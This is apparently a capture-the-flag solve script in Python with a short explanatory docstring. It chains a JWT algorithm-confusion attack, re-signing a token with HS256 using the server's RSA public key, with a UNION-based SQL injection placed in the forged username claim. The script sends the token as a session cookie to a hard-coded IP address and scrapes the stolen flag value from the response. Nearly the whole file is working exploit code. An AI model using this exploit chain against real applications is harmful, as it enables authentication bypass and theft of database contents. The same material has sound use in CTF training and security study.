'''
1. Crack JWT
    https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6

    The algorithm HS256 uses the secret key to sign and verify each message.
    The algorithm RS256 uses the private key to sign the message
    and uses the public key for authentication.
    If you change the algorithm from RS256 to HS256,
    the backend code uses the public key as the secret key
    and then uses the HS256 algorithm to verify the signature.
    Because the public key can sometimes be obtained by the attacker,
    the attacker can modify the algorithm in the header to HS256
    and then use the RSA public key to sign the data.

2. SQL injection
    - Using
        SELECT name
        FROM sqlite_master
        WHERE type ='table'
        AND name NOT LIKE 'sqlite_%' to find tables
    - Using PRAGMA_TABLE_INFO to find table columns
'''

import jwt  # require version 0.4.3
import requests
from bs4 import BeautifulSoup

url = 'http://157.245.40.149:31371/'

pk = open('public.pem', 'r').read()

# Use for testing
SAMPLE_TOKEN = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE5NW9UbTlETnpjSHI4Z0xoalphWVxua3RzYmoxS3h4VU9vencwdHJQOTNCZ0lwWHY2V2lwUVJCNWxxb2ZQbFU2RkI5OUpjNVFaMDQ1OXQ3M2dnVkRRaVxuWHVDTUkyaG9VZkoxVm1qTmVXQ3JTckRVaG9rSUZaRXVDdW1laHd3dFVOdUV2MGV6QzU0WlRkRUM1WVNUQU96Z1xuaklXYWxzSGovZ2E1WkVEeDNFeHQwTWg1QUV3YkFENzMrcVhTL3VDdmhmYWpncHpIR2Q5T2dOUVU2MExNZjJtSFxuK0Z5bk5zak5Od281blJlN3RSMTJXYjJZT0N4dzJ2ZGFtTzFuMWtmL1NNeXBTS0t2T2dqNXkwTEdpVTNqZVhNeFxuVjhXUytZaVlDVTVPQkFtVGN6Mncya3pCaFpGbEg2Uks0bXF1ZXhKSHJhMjNJR3Y1VUo1R1ZQRVhwZENxSzNUclxuMHdJREFRQUJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLVxuIiwiaWF0IjoxNjA0MzgwNzcxfQ.4LStSEbpSjkbUaNP7_v5S0V-c7pHGX39N_To5tHX4O6sak07HmfIBKuSC4gpEHUuz8Y_u6xLu8Quj36a43NTt8fVRpqA9cxtsMcw1ouC2gZkonX83s2I0V2S7ogWMfy0gy9cFvEZI2lLqT1Ltv5Vs5G1ieXzYXP9l2Nh8Sa56BNPpq0Y2NYsSaZr_EW5azYfpY5dZAVKTVYPybdhGBak1lwRMm4mqpGaykPE6Txhi-QmQI6LK9PjWKXLqsGb9CZkjQtFpJWbXzVU_-yKinS9wF89_0-N2QtpT8U6omjBZ2GhiWt_vNYfZ2fvX-PSHMA2_F8MOtFwvBbL5ectQmIbmQ'


def sign_jwt(username):
    return jwt.encode({
        'username': username,
    }, key=pk, algorithm='HS256').decode('utf-8')


# copy from source code
def decode_jwt(token):
    return jwt.decode(token, pk, 'HS256')


def main():
    # Full SQL -> SELECT * FROM users WHERE username = '${username}'
    sql_injection = '''\'
        UNION
        SELECT
            id,
            top_secret_flaag as username,
            'random'
        FROM flag_storage
        ORDER BY 1 ASC LIMIT 1 --'''

    token = sign_jwt(sql_injection)
    resp = requests.get(url, headers={
        'Cookie': f'session={token}',
    })

    if resp.status_code == 200:
        # print(resp.text)
        soup = BeautifulSoup(resp.text, 'html.parser')
        dom = soup.find_all(class_='card-body')
        msg = dom[0].text.strip().split(' ')[1].strip()
        print(f'Message from DB: {msg}')
    else:
        print('SQL injection failed !!')


if __name__ == '__main__':
    main()
